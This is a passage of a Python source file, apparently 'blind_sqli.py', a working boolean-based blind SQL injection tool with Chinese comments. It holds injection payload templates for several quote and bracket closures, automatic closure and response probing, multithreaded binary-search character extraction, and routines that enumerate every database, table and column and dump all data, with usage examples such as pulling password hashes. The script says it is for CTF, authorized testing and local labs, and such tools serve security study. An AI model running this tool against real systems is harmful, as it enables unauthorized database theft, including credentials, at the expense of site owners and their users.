            if evaluate_response(tr2, cfg) is not True or evaluate_response(fr2, cfg) is not False:
                return False
    return True


def closure_candidates() -> List[Tuple[str, str, str, str]]:
    """
    基础闭合候选。

    返回：name, bool_tpl, gt_tpl, eq_tpl。
    bool_tpl 使用 {expr}，gt_tpl / eq_tpl 使用 {query} {i} {mid}。
    """
    return [
        (
            "numeric",
            "1 and {expr}",
            "1 and ascii(substr(({query}),{i},1))>{mid}",
            "1 and ascii(substr(({query}),{i},1))={mid}",
        ),
        (
            "numeric-comment-dash",
            "1 and {expr}-- -",
            "1 and ascii(substr(({query}),{i},1))>{mid}-- -",
            "1 and ascii(substr(({query}),{i},1))={mid}-- -",
        ),
        (
            "single-quote",
            "1' and {expr}-- -",
            "1' and ascii(substr(({query}),{i},1))>{mid}-- -",
            "1' and ascii(substr(({query}),{i},1))={mid}-- -",
        ),
        (
            "double-quote",
            '1" and {expr}-- -',
            '1" and ascii(substr(({query}),{i},1))>{mid}-- -',
            '1" and ascii(substr(({query}),{i},1))={mid}-- -',
        ),
        (
            "single-quote-paren",
            "1') and {expr}-- -",
            "1') and ascii(substr(({query}),{i},1))>{mid}-- -",
            "1') and ascii(substr(({query}),{i},1))={mid}-- -",
        ),
        (
            "double-quote-paren",
            '1") and {expr}-- -',
            '1") and ascii(substr(({query}),{i},1))>{mid}-- -',
            '1") and ascii(substr(({query}),{i},1))={mid}-- -',
        ),
    ]


def raw_request(session: requests.Session, cfg: Config, payload: str) -> Optional[Tuple[int, str]]:
    """发送原始请求，返回 status_code 与响应文本；用于闭合方式探测，不依赖 true_mark。"""
    resp = send_raw(session, cfg, payload)
    if resp is None:
        return None
    return resp.status_code, resp.text or ""


def response_signature(status: int, text: str, limit: int) -> Tuple[int, int, str]:
    """轻量签名：状态码、长度、规范化后的前缀。"""
    normalized = normalize_text(text, limit)
    return status, len(normalized), normalized[:200]


def responses_separable(
    true_items: List[Tuple[int, str]],
    false_items: List[Tuple[int, str]],
    limit: int,
) -> bool:
    """判断真/假响应是否稳定可区分。"""
    if not true_items or not false_items:
        return False

    true_status = [s for s, _ in true_items]
    false_status = [s for s, _ in false_items]
    if len(set(true_status)) == 1 and len(set(false_status)) == 1 and true_status[0] != false_status[0]:
        return True

    true_lens = [len(normalize_text(t, limit)) for _, t in true_items]
    false_lens = [len(normalize_text(t, limit)) for _, t in false_items]
    true_avg = sum(true_lens) / len(true_lens)
    false_avg = sum(false_lens) / len(false_lens)
    true_spread = max(true_lens) - min(true_lens)
    false_spread = max(false_lens) - min(false_lens)
    if abs(true_avg - false_avg) > max(30, true_spread + false_spread + 10):
        return True

    true_sigs = {response_signature(s, t, limit) for s, t in true_items}
    false_sigs = {response_signature(s, t, limit) for s, t in false_items}
    return true_sigs.isdisjoint(false_sigs)


def probe_closure(session: requests.Session, cfg: Config, samples: int = 2) -> bool:
    """
    自动探测基础闭合方式。

    成功后会更新 cfg.payload / cfg.eq_payload / cfg.len_payload / cfg.true_payload / cfg.false_payload。
    这里直接比较真/假原始响应差异，不依赖 cfg.true_mark 或 send_check，
    因此可独立于 --auto-mark 工作。
    """
    print("[*] 正在探测基础闭合方式...")

    original_payload = cfg.payload
    original_eq_payload = cfg.eq_payload
    original_len_payload = cfg.len_payload

    for name, bool_tpl, gt_tpl, eq_tpl in closure_candidates():
        true_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_TRUE)
        false_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_FALSE)

        true_items: List[Tuple[int, str]] = []
        false_items: List[Tuple[int, str]] = []
        failed = False

        for _ in range(samples):
            true_resp = raw_request(session, cfg, true_payload)
            false_resp = raw_request(session, cfg, false_payload)
            if true_resp is None or false_resp is None:
                failed = True
                break
            true_items.append(true_resp)
            false_items.append(false_resp)

        if failed:
            continue

        if responses_separable(true_items, false_items, cfg.auto_lcs_limit):
            cfg.payload = gt_tpl
            cfg.eq_payload = eq_tpl
            cfg.len_payload = bool_tpl.format(expr="length(({query}))>{mid}")
            cfg.true_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_TRUE)
            cfg.false_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_FALSE)
            print(f"[+] 闭合方式探测成功: {name}")
            if cfg.verbose:
                print(f"[debug] payload     = {cfg.payload}")
                print(f"[debug] eq_payload  = {cfg.eq_payload}")
                print(f"[debug] len_payload = {cfg.len_payload}")
            return True

    cfg.payload = original_payload
    cfg.eq_payload = original_eq_payload
    cfg.len_payload = original_len_payload
    print("[!] 未能自动确认闭合方式，将继续使用当前 payload 模板。")
    return False


def make_len_payload(cfg: Config, mid: int) -> str:
    if cfg.len_payload:
        return cfg.len_payload.format(query=cfg.query, mid=mid)
    return cfg.payload.format(query=f"length(({cfg.query}))", i=1, mid=mid)


def detect_length(session: requests.Session, cfg: Config) -> Optional[int]:
    print("[*] 正在探测结果长度...")
    if cfg.len_payload is None:
        print("[!] 未提供 --len-payload，将使用主 payload 派生长度探测。")
        print('    常见写法: --len-payload "1 and length(({query}))>{mid}"')
        print('    字符型闭合: --len-payload "1\' and length(({query}))>{mid}-- -"')

    gt_max = send_check(session, cfg, make_len_payload(cfg, cfg.max_len))
    if gt_max is None:
        return None
    if gt_max:
        print(f"[!] 结果长度大于 max_len={cfg.max_len}，将按 max_len 提取，结果可能被截断。")
        return cfg.max_len

    left, right = 0, cfg.max_len
    while left < right:
        mid = (left + right) // 2
        result = send_check(session, cfg, make_len_payload(cfg, mid))
        if result is None:
            return None
        if result:
            left = mid + 1
        else:
            right = mid
    print(f"[+] 探测到结果长度: {left}")
    return left


def ascii_gt(session: requests.Session, cfg: Config, pos: int, value: int) -> Optional[bool]:
    return send_check(session, cfg, cfg.payload.format(query=cfg.query, i=pos, mid=value))


def ascii_eq(session: requests.Session, cfg: Config, pos: int, value: int) -> Optional[bool]:
    return send_check(session, cfg, cfg.eq_payload.format(query=cfg.query, i=pos, mid=value))


def binary_search_ascii(session: requests.Session, cfg: Config, pos: int) -> Optional[CharResult]:
    chars = cfg.sorted_chars

    if cfg.check_boundary:
        min_ord, max_ord = ord(chars[0]), ord(chars[-1])
        gt_max = ascii_gt(session, cfg, pos, max_ord)
        if gt_max is None:
            return None
        if gt_max:
            return UNKNOWN
        gt_before_min = ascii_gt(session, cfg, pos, min_ord - 1)
        if gt_before_min is None:
            return None
        if not gt_before_min:
            return UNKNOWN

    lo, hi = 0, len(chars) - 1
    while lo < hi:
        mid_idx = (lo + hi) // 2
        result = ascii_gt(session, cfg, pos, ord(chars[mid_idx]))
        if result is None:
            return None
        if result:
            lo = mid_idx + 1
        else:
            hi = mid_idx

    candidate = chars[lo]
    eq = ascii_eq(session, cfg, pos, ord(candidate))
    if eq is None:
        return None
    return candidate if eq else UNKNOWN


def load_resume(path: Optional[Path], length: int) -> List[Optional[str]]:
    if not path or not path.exists():
        return [None] * length
    data = path.read_text(encoding="utf-8", errors="ignore").rstrip("\n")
    # UNKNOWN（"?"）与 \x00 一样视为未知位，恢复时重新提取
    chars: List[Optional[str]] = [None if ch in ("\x00", UNKNOWN) else ch for ch in data[:length]]
    while len(chars) < length:
        chars.append(None)
    known = sum(1 for ch in chars if ch not in (None, UNKNOWN))
    print(f"[+] 已从断点文件读取 {known}/{length} 位。")
    return chars


def save_resume(path: Optional[Path], result_chars: List[Optional[str]]) -> None:
    if not path:
        return
    with file_lock:
        path.write_text(
            "".join(ch if ch not in (None, UNKNOWN) else "\x00" for ch in result_chars),
            encoding="utf-8",
        )


class ResumeSaver:
    def __init__(self, cfg: Config, result_chars: List[Optional[str]]):
        self.cfg = cfg
        self.result_chars = result_chars
        self.last_save = 0.0
        self.changed = 0
        self.lock = Lock()

    def maybe_save(self, force: bool = False) -> None:
        if not self.cfg.resume_file:
            return
        with self.lock:
            now = time.time()
            self.changed += 1
            if force or self.changed >= self.cfg.save_every or now - self.last_save >= self.cfg.save_interval:
                save_resume(self.cfg.resume_file, self.result_chars)
                self.changed = 0
                self.last_save = now


def print_progress(completed: int, total: int, partial: str) -> None:
    print(f"\r{PROGRESS_CLEAR}[+] 进度 {completed}/{total}: {partial}", end="", flush=True)


def wait_on_exit() -> None:
    """Windows 下退出前等待回车，避免双击运行窗口一闪而过（同 sqlmap 行为）。"""
    if sys.platform != "win32" or "--non-interactive" in sys.argv:
        return
    try:
        if sys.stdin and sys.stdin.isatty():
            print("\nPress Enter to continue...", end="", flush=True)
            input()
    except Exception:
        pass


def extract_query(
    session: requests.Session,
    cfg: Config,
    query: str,
    use_resume: bool = True,
    show_result: bool = True,
) -> str:
    """在已完成特征探测的基础上，提取单条查询的结果。"""
    cfg.query = query
    length = cfg.max_len

    if not cfg.no_length_detect:
        detected = detect_length(session, cfg)
        if detected is None:
            print("[!] 长度探测失败，改用 max_len 继续。")
        else:
            length = detected

    if length <= 0:
        print("[+] 查询结果为空。")
        return ""

    result_chars = load_resume(cfg.resume_file, length) if use_resume else [None] * length
    saver = ResumeSaver(cfg, result_chars)
    print(f"[*] 开始提取，共 {length} 位，线程数={cfg.threads}")

    pending = [i for i in range(1, length + 1) if result_chars[i - 1] in (None, UNKNOWN)]
    if not pending:
        final = "".join(ch or UNKNOWN for ch in result_chars)
        if show_result:
            print_result(final)
        return final

    if cfg.threads <= 1:
        for pos in pending:
            ch = binary_search_ascii(session, cfg, pos)
            if ch is None:
                print(f"\n[!] 第 {pos} 位请求失败，中止。")
                break
            result_chars[pos - 1] = ch
            saver.maybe_save()
            partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
            completed = sum(1 for c in result_chars if c is not None)
            print_progress(completed, length, partial)
        saver.maybe_save(force=True)
        final = "".join(ch or UNKNOWN for ch in result_chars)
        if show_result:
            print_result(final)
        return final

    def worker(pos: int) -> Tuple[int, Optional[CharResult]]:
        return pos, binary_search_ascii(get_thread_session(cfg), cfg, pos)

    completed = sum(1 for c in result_chars if c is not None)
    with ThreadPoolExecutor(max_workers=cfg.threads) as executor:
        futures = {executor.submit(worker, pos): pos for pos in pending}
        for future in as_completed(futures):
            pos = futures[future]
            try:
                _, ch = future.result()
            except Exception as e:
                ch = None
                with print_lock:
                    print(f"\n[!] 第 {pos} 位线程异常: {e}")
            result_chars[pos - 1] = ch if ch is not None else UNKNOWN
            completed += 1
            saver.maybe_save()
            partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
            with print_lock:
                print_progress(completed, length, partial)

    saver.maybe_save(force=True)
    final = "".join(ch or UNKNOWN for ch in result_chars)
    if show_result:
        print_result(final)
    return final


def extract(cfg: Config) -> str:
    main_session = new_session(cfg)

    if cfg.probe_closure:
        probe_closure(main_session, cfg, samples=cfg.probe_samples)

    if cfg.auto_mark:
        auto_detect_true_feature(main_session, cfg)

    return extract_query(main_session, cfg, cfg.query)


def print_result(result: str) -> None:
    print(f"\n\n{'=' * 50}")
    print(f"[✓] 提取结果: {result}")
    print(f"{'=' * 50}")


def esc_sql(value: str) -> str:
    """MySQL 字符串字面量转义（单引号翻倍）。"""
    return value.replace("'", "''")


def esc_ident(value: str) -> str:
    """MySQL 反引号标识符转义（反引号翻倍）。"""
    return value.replace("`", "``")


def split_value(text: str) -> List[str]:
    """拆分 group_concat(... SEPARATOR 0x7c) 的结果。"""
    return [x.strip() for x in (text or "").split("|") if x.strip()]


_SYSTEM_DBS = {"information_schema", "mysql", "performance_schema", "sys"}
RESULT_DIR = Path(__file__).resolve().parent / "result"
RESULT_DUMP_CAP = 4096


def extract_value(
    session: requests.Session,
    cfg: Config,
    query: str,
    label: str = "",
    length_cap: Optional[int] = None,
) -> str:
    """提取单条枚举查询结果，输出一行摘要（不打印大号结果框）。"""
    old_cap = cfg.max_len
    if length_cap:
        cfg.max_len = min(cfg.max_len, length_cap)
    try:
        if label:
            print(f"\n[*] 提取 {label} ...")
        value = extract_query(session, cfg, query, use_resume=False, show_result=False)
        if label:
            print(f"[✓] {label} => {value}")
        return value
    finally:
        cfg.max_len = old_cap


def result_stem(url: str) -> str:
    """按 目标主机_端口_时间 生成结果文件名主体。"""
    parts = urlsplit(url)
    host = parts.hostname or "unknown"
    port = parts.port or (443 if parts.scheme == "https" else 80)
    now = datetime.now()
    ts = f"{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}"
    return f"{host}_{port}_{ts}"


def save_dump_report(url: str, lines: List[str]) -> Path:
    """把 dump 报告保存到 result/ 目录，重名时自动加序号。"""
    RESULT_DIR.mkdir(parents=True, exist_ok=True)
    stem = result_stem(url)
    path = RESULT_DIR / f"{stem}.txt"
    n = 1
    while path.exists():
        path = RESULT_DIR / f"{stem}_{n}.txt"
        n += 1
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def view_history(url: Optional[str] = None) -> int:
    """--view：查看已保存的历史 dump 记录。"""
    if not RESULT_DIR.exists():
        print("[!] 暂无历史记录（result 目录不存在）。")
        return 0
    if url:
        parts = urlsplit(url)
        host = parts.hostname or ""
        port = parts.port or (443 if parts.scheme == "https" else 80)
        files = sorted(RESULT_DIR.glob(f"{host}_{port}_*.txt"))
        if not files:
            print(f"[!] 未找到 {host}:{port} 的历史记录。")
            return 0
        if len(files) > 1:
            print(f"[*] 该目标共有 {len(files)} 条历史记录：")
            for f in files:
                print(f"    {f.name}")
        latest = files[-1]
        print(f"\n[+] 显示最新记录: {latest.name}\n")
        print(latest.read_text(encoding="utf-8", errors="replace"))
    else:
        files = sorted(RESULT_DIR.glob("*.txt"))
        if not files:
            print("[!] 暂无历史记录。")
            return 0
        print(f"[+] 共 {len(files)} 条历史记录：")
        for f in files:
            print(f"    {f.name}")
        print("\n[*] 查看指定目标: python blind_sqli.py --view <目标URL>")
    return 0


def prepare_detection(session: requests.Session, cfg: Config) -> None:
    """枚举前准备：必要时自动探测闭合方式与 true/false 特征。"""
    if cfg.true_mark == DEFAULT_TRUE_MARK:
        cfg.auto_mark = True
    if cfg.payload == DEFAULT_PAYLOAD:
        cfg.probe_closure = True
    if cfg.probe_closure:
        probe_closure(session, cfg, samples=cfg.probe_samples)
    if cfg.auto_mark:
        # 探测用永非空查询，避免默认 -q 在目标上结果为空导致特征误判
        old_query = cfg.query
        cfg.query = "select 1"
        try:
            auto_detect_true_feature(session, cfg)
        finally:
            cfg.query = old_query


def highlight_keyword(text: str, keyword: str) -> str:
    """把文本中所有关键词出现处用红色高亮（不支持颜色时原样返回）。"""
    if not keyword or not RED:
        return text
    pattern = re.compile(re.escape(keyword), re.IGNORECASE)
    return pattern.sub(lambda m: f"{RED}{m.group(0)}{RESET}", text)


def dump_databases(cfg: Config, include_system: bool) -> None:
    """
    --dump / --dump-all：自动枚举 数据库 → 表 → 列，全量拉取所有数据，
    保存报告到 result/ 目录，并自动回放（同 --view）不退出。
    """
    session = new_session(cfg)
    prepare_detection(session, cfg)

    report: List[str] = []
    report.append("=" * 50)
    report.append("SQLi 全量 dump 报告")
    report.append(f"目标: {cfg.url}")
    report.append(f"时间: {datetime.now():%Y-%m-%d %H:%M}")
    report.append(f"线程: {cfg.threads}")
    report.append("=" * 50)

    print("\n[*] 开始自动枚举数据库...")
    dbs_raw = extract_value(
        session,
        cfg,
        "select group_concat(schema_name SEPARATOR 0x7c) from information_schema.schemata",
        "数据库列表",
    )
    dbs = split_value(dbs_raw)
    if not dbs:
        print("[!] 未发现任何数据库。")
        report.append("[!] 未发现任何数据库。")
        path = save_dump_report(cfg.url, report)
        print(f"[+] 报告已保存: {path}")
        return

    print(f"\n[+] 共发现 {len(dbs)} 个数据库: {', '.join(dbs)}")
    report.append(f"[+] 共发现 {len(dbs)} 个数据库: {', '.join(dbs)}")

    for db in dbs:
        if not include_system and db.lower() in _SYSTEM_DBS:
            print(f"[·] 跳过系统库: {db}")
            report.append(f"[·] 跳过系统库: {db}")
            continue
        print(f"\n{'=' * 50}\n数据库: {db}\n{'=' * 50}")
        report.append("")
        report.append(f"[数据库] {db}")
        tables_raw = extract_value(
            session,
            cfg,
            f"select group_concat(table_name SEPARATOR 0x7c) from information_schema.tables "
            f"where table_schema='{esc_sql(db)}'",
            f"{db} 的表",
        )
        tables = split_value(tables_raw)
        if not tables:
            print("[!] 该库下没有表。")
            report.append("  [!] 该库下没有表。")
            continue
        print(f"[+] {db} 的表 ({len(tables)}): {', '.join(tables)}")
        report.append(f"  [表] {', '.join(tables)}")

        for tbl in tables:
            cols_raw = extract_value(
                session,
                cfg,
                f"select group_concat(column_name SEPARATOR 0x7c) from information_schema.columns "
                f"where table_schema='{esc_sql(db)}' and table_name='{esc_sql(tbl)}'",
                f"{db}.{tbl} 的列",
            )
            cols = split_value(cols_raw)
            print(f"    - {db}.{tbl}: {', '.join(cols) if cols else '(无列)'}")
            report.append(f"  [表] {db}.{tbl}")
            report.append(f"    [列] {', '.join(cols) if cols else '(无列)'}")

            # 全量拉取：所有表的每一列数据都提取
            for col in cols:
                data = extract_value(
                    session,
                    cfg,
                    f"select group_concat({esc_ident(col)} SEPARATOR 0x7c) "
                    f"from {esc_ident(db)}.{esc_ident(tbl)}",
                    f"数据 {db}.{tbl}.{col}",
                    length_cap=RESULT_DUMP_CAP,
                )
                print(f"      [数据] {db}.{tbl}.{col} = {data}")
                report.append(f"    {col}: {data}")

    path = save_dump_report(cfg.url, report)
    print(f"\n[+] 报告已保存: {path}")

    # 不退出：自动执行“观看数据库”视图（同 --view 参数）
    print("\n[+] 自动回放历史视图:")
    print("=" * 50)
    print(path.read_text(encoding="utf-8", errors="replace"))
    print("=" * 50)


def dump_flag_search(cfg: Config, keyword: str) -> None:
    """
    --dump-flag <关键词>：在用户库（不含系统库）中搜索
    表名 / 列名 / 数据 与关键词匹配的内容，命中处高亮显示。
    """
    if not keyword:
        print("[!] --dump-flag 需要一个关键词参数，例如: --dump-flag flag")
        return

    session = new_session(cfg)
    prepare_detection(session, cfg)

    print(f"\n[*] 搜索关键词: {keyword!r}（忽略大小写，不含系统库）")
    pattern = re.compile(re.escape(keyword), re.IGNORECASE)
    hits = 0

    dbs_raw = extract_value(
        session,
        cfg,
        "select group_concat(schema_name SEPARATOR 0x7c) from information_schema.schemata",
        "数据库列表",
    )
    dbs = split_value(dbs_raw)
    if not dbs:
        print("[!] 未发现任何数据库。")
        return

    for db in dbs:
        if db.lower() in _SYSTEM_DBS:
            continue
        tables_raw = extract_value(
            session,
            cfg,
            f"select group_concat(table_name SEPARATOR 0x7c) from information_schema.tables "
            f"where table_schema='{esc_sql(db)}'",
            f"{db} 的表",
        )
        tables = split_value(tables_raw)
        for tbl in tables:
            if pattern.search(tbl):
                print(f"  [表名] {highlight_keyword(f'{db}.{tbl}', keyword)}")
                hits += 1
            cols_raw = extract_value(
                session,
                cfg,
                f"select group_concat(column_name SEPARATOR 0x7c) from information_schema.columns "
                f"where table_schema='{esc_sql(db)}' and table_name='{esc_sql(tbl)}'",
                f"{db}.{tbl} 的列",
            )
            cols = split_value(cols_raw)
            for col in cols:
                if pattern.search(col):
                    print(f"  [列名] {highlight_keyword(f'{db}.{tbl}.{col}', keyword)}")
                    hits += 1
                data = extract_value(
                    session,
                    cfg,
                    f"select group_concat({esc_ident(col)} SEPARATOR 0x7c) "
                    f"from {esc_ident(db)}.{esc_ident(tbl)}",
                    f"搜索 {db}.{tbl}.{col}",
                    length_cap=RESULT_DUMP_CAP,
                )
                if pattern.search(data):
                    print(f"  [数据] {db}.{tbl}.{col} = {highlight_keyword(data, keyword)}")
                    hits += 1

    if hits:
        print(f"\n[+] 共 {hits} 处命中关键词 {keyword!r}。")
    else:
        print("[!] 未找到包含该关键词的内容。")


def build_query(args) -> Tuple[str, str]:
    query = args.query
    charset = args.charset
    if args.hex:
        query = f"hex(({query}))"
        if args.charset == DEFAULT_CHARSET:
            charset = DEFAULT_HEX_CHARSET
        else:
            print("[!] 已启用 --hex，但检测到你自定义了 --charset，将保留自定义字符集。")
            print(f"    若只提取十六进制字符，建议使用: --charset {DEFAULT_HEX_CHARSET!r}")
    return query, charset


def sanitize_url(url: str) -> str:
    """去掉 URL 自带的查询串，避免与注入参数重复提交造成歧义。"""
    parts = urlsplit(url)
    if parts.query:
        print(f"[!] URL 自带查询串将被忽略: {parts.query!r}")
        return urlunsplit((parts.scheme, parts.netloc, parts.path, "", parts.fragment))
    return url


def build_config(args) -> Config:
    headers = parse_kv(args.headers, ":")
    cookies = parse_kv(args.cookies, "=")
    query, charset = build_query(args)
    url = sanitize_url(args.url)

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    if args.no_verify:
        try:
            import urllib3

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass

    if args.threads < 1:
        raise ValueError("threads 必须 >= 1")
    if args.max_len < 1:
        raise ValueError("max-len 必须 >= 1")
    if args.retries < 1:
        raise ValueError("retries 必须 >= 1")
    if args.save_every < 1:
        raise ValueError("save-every 必须 >= 1")
    if args.auto_samples < 2:
        raise ValueError("auto-samples 必须 >= 2")

    return Config(
        url=url,
        param=args.param,
        query=query,
        payload=args.payload,
        eq_payload=args.eq_payload,
        len_payload=args.len_payload,
        true_payload=args.true_payload,
        false_payload=args.false_payload,
        true_mark=args.true_mark,
        check_mode="marker",
        length_threshold=None,
        status_code=None,
        method=args.method,
        timeout=args.timeout,
        retries=args.retries,
        delay=args.delay,
        jitter=args.jitter,
        max_len=args.max_len,
        threads=args.threads,
        charset=charset,
        no_length_detect=args.no_length_detect,
        check_boundary=args.check_boundary,
        probe_closure=args.probe_closure,
        probe_samples=args.probe_samples,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        resume_file=Path(args.resume) if args.resume else None,
        save_every=args.save_every,
        save_interval=args.save_interval,
        auto_mark=args.auto_mark,
        auto_samples=args.auto_samples,
        auto_min_marker_len=args.auto_min_marker_len,
        auto_lcs_limit=args.auto_lcs_limit,
        normalize_response=not args.no_normalize,
        verbose=args.verbose,
        dump=args.dump,
        dump_all=args.dump_all,
        dump_flag=args.dump_flag,
        verify=not args.no_verify,
    )


HELP_EXAMPLES = """\
示例（详细参数说明见上方各分组）：

  1) 基础用法：手动指定 true 特征，提取单条查询
     python blind_sqli.py -u "http://target/index.php?id=1" -p id \\
         -q "select flag from flag" --true-mark "Welcome"

  2) 全自动：自动探测闭合方式 + 自动识别 true/false 特征
     python blind_sqli.py -u "http://target/index.php?id=1" \\
         -q "select flag from flag" --probe-closure --auto-mark

  3) 字符型注入（单引号闭合）：需显式指定 payload 模板
     python blind_sqli.py -u "http://target/index.php?id=1" -p id \\
         -q "select flag from secret" --true-mark "User found" \\
         --payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -" \\
         --eq-payload "1' and ascii(substr(({query}),{i},1))={mid}-- -" \\
         --len-payload "1' and length(({query}))>{mid}-- -"

三个 payload 模板的分工（{query}/{i}/{mid} 由脚本自动替换）：

     参数           模板                                             作用                                              
     ━━━━━━━ ━━━━━━━━━━━━━━━━━━━━━━━━ ━━━━━━━━━━━━━━━━━━━━━━━━━
     --payload      1' and ascii(substr(({query}),{i},1))>{mid}-- -  判断"第 i 个字符的 ASCII 是否大于 mid"，二分查找用
     ─────── ──────────────────────── ─────────────────────────
     --eq-payload   ...ascii(...)={mid}-- -                          二分定位到唯一候选后，做等值确认                  
     ─────── ──────────────────────── ─────────────────────────
     --len-payload  1' and length(({query}))>{mid}-- -               先二分探测结果长度                                

  4) 提取 HEX 数据（如密码哈希）
     python blind_sqli.py -u "http://target/index.php?id=1" \\
         -q "select password from users limit 1" --hex

  5) 高并发 + 断点续传（适合长时间提取）
     python blind_sqli.py -u "http://target/index.php?id=1" -t 8 \\
         --resume result.tmp --save-every 10

  6) 代理 + 自定义 Header / Cookie
     python blind_sqli.py -u "http://target/index.php?id=1" \\
         --proxy http://127.0.0.1:8080 \\
         --headers "User-Agent: Mozilla/5.0" --cookies "PHPSESSID=abc123"

  7) 全量枚举数据库（库 → 表 → 列 → 数据），保存到 result/ 并自动回放
     python blind_sqli.py -u "http://target/index.php?id=1" --dump       # 跳过系统库
     python blind_sqli.py -u "http://target/index.php?id=1" --dump-all   # 含系统库

  8) 关键词搜索（表名/列名/数据，不含系统库），命中高亮
     python blind_sqli.py -u "http://target/index.php?id=1" --dump-flag flag

  9) 查看历史 dump 记录
     python blind_sqli.py --view "http://target.com"     # 指定目标的最新记录
     python blind_sqli.py --view                         # 列出全部历史
"""


def parse_args():
    parser = argparse.ArgumentParser(
        description="通用 Boolean-Based SQL 盲注提取脚本，仅用于 CTF / 授权测试 / 本地靶场。",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=HELP_EXAMPLES,
    )

    basic = parser.add_argument_group("基本参数")
    basic.add_argument("-u", "--url", default=DEFAULT_URL, help="目标 URL")
    basic.add_argument("-p", "--param", default=DEFAULT_PARAM, help="注入参数名")
    basic.add_argument("-q", "--query", default=DEFAULT_QUERY, help="要提取的 SQL 查询")
    basic.add_argument("--payload", default=DEFAULT_PAYLOAD, help="大于判断 payload 模板")
    basic.add_argument("--eq-payload", default=DEFAULT_EQ_PAYLOAD, help="等值校验 payload 模板")
    basic.add_argument("--len-payload", default=DEFAULT_LEN_PAYLOAD, help="长度判断 payload 模板；特殊闭合方式时建议显式指定")
    basic.add_argument("--true-mark", default=DEFAULT_TRUE_MARK, help="条件为真时响应中包含的特征字符串")

    detect = parser.add_argument_group("特征自动识别")
    detect.add_argument("--auto-mark", action="store_true", help="自动识别 true/false 响应特征")
    detect.add_argument("--true-payload", default=DEFAULT_TRUE_PAYLOAD, help="自动识别时使用的永真 payload")
    detect.add_argument("--false-payload", default=DEFAULT_FALSE_PAYLOAD, help="自动识别时使用的永假 payload")
    detect.add_argument("--auto-samples", type=int, default=4, help="自动识别采样次数")
    detect.add_argument("--auto-min-marker-len", type=int, default=6, help="自动 marker 最小长度")
    detect.add_argument("--auto-lcs-limit", type=int, default=6000, help="自动识别时最多分析响应前 N 个字符")
    detect.add_argument("--no-normalize", action="store_true", help="自动识别时不压缩空白/移除 HTML 注释")

    request = parser.add_argument_group("请求控制")
    request.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP 方法")
    request.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="请求超时秒数")
    request.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="请求失败重试次数")
    request.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="固定延迟秒数")
    request.add_argument("--jitter", type=float, default=0.0, help="随机额外延迟秒数")
    request.add_argument("--proxy", help="代理，例如 http://127.0.0.1:8080")
    request.add_argument("--cookies", nargs="+", metavar="k=v", help="Cookie，可多个")
    request.add_argument("--headers", nargs="+", metavar="k:v", help="Header，可多个")
    request.add_argument("--no-verify", action="store_true", help="跳过 TLS 证书校验（自签名证书目标时使用）")

    extract = parser.add_argument_group("提取控制")
    extract.add_argument("--max-len", type=int, default=DEFAULT_MAX_LEN, help="最大提取长度")
    extract.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="线程数")
    extract.add_argument("--charset", default=DEFAULT_CHARSET, help="猜解字符集")
    extract.add_argument("--hex", action="store_true", help="提取 hex(({query})) 的结果；默认字符集会自动收缩为十六进制字符")
    extract.add_argument("--check-boundary", action="store_true", help="启用字符集边界预检；字符集不完整时更稳，但会增加请求")
    extract.add_argument("--probe-closure", action="store_true", help="自动探测基础闭合方式，并生成 payload / eq-payload / len-payload")
    extract.add_argument("--probe-samples", type=int, default=2, help="闭合方式探测时每个候选真/假请求采样次数")
    extract.add_argument("--no-length-detect", action="store_true", help="跳过长度探测")
    extract.add_argument("--resume", help="断点续传文件路径，例如 result.tmp")
    extract.add_argument("--save-every", type=int, default=5, help="断点文件每完成 N 位保存一次")
    extract.add_argument("--save-interval", type=float, default=2.0, help="断点文件至少每隔多少秒保存一次")

    enum = parser.add_argument_group("数据库枚举")
    dump_group = enum.add_mutually_exclusive_group()
    dump_group.add_argument("--dump", action="store_true", help="全量拉取用户数据库（跳过系统库），保存到 result/ 并自动回放")
    dump_group.add_argument("--dump-all", action="store_true", help="全量拉取所有数据库（含系统库），保存到 result/ 并自动回放")
    dump_group.add_argument(
        "--dump-flag",
        "-dump-flag",
        metavar="关键词",
        help="在用户库（不含系统库）中搜索表名/列名/数据含关键词的内容并高亮",
    )
    enum.add_argument(
        "--view",
        nargs="?",
        const="",
        default=None,
        metavar="URL",
        help="查看历史 dump 记录（可不带地址，列出全部）",
    )

    misc = parser.add_argument_group("其他")
    misc.add_argument("--verbose", action="store_true", help="输出调试信息")
    misc.add_argument("--non-interactive", action="store_true", help="Windows 下退出时不等待回车（脚本/无人值守场景）")
    misc.add_argument("--version", action="version", version=f"%(prog)s {__version__}")

    return parser.parse_args()


def main() -> int:
    if not any(flag in sys.argv for flag in ("-h", "--help", "--version")):
        print(LOGO)
        print("=" * 50)
        print("  通用 Boolean-Based SQL 盲注脚本")
        print("  仅用于 CTF / 授权测试 / 本地靶场")
        print("=" * 50)

        # 启动时检查更新（总是询问；--non-interactive 无人值守时跳过交互）
        if "--non-interactive" not in sys.argv:
            run_startup_update_check()

    if len(sys.argv) == 1:
        print("[!] 缺少必需参数。请至少提供目标 URL（-u），例如：")
        print('    python blind_sqli.py -u "http://target/index.php?id=1" -q "select flag from flag" --auto-mark')
        print("    完整用法与示例见: python blind_sqli.py --help")
        print("    如需无人值守运行，请加 --non-interactive")
        wait_on_exit()
        return 2

    try:
        args = parse_args()
        if args.view is not None:
            rc = view_history(args.view or None)
            wait_on_exit()
            return rc
        cfg = build_config(args)
    except SystemExit:
        # --help / --version 由 argparse 直接退出，双击场景下同样停留
        wait_on_exit()
        raise
    except Exception as e:
        print(f"[!] 参数错误: {e}")
        wait_on_exit()
        return 2

    print(f"[*] 目标: {cfg.url}")
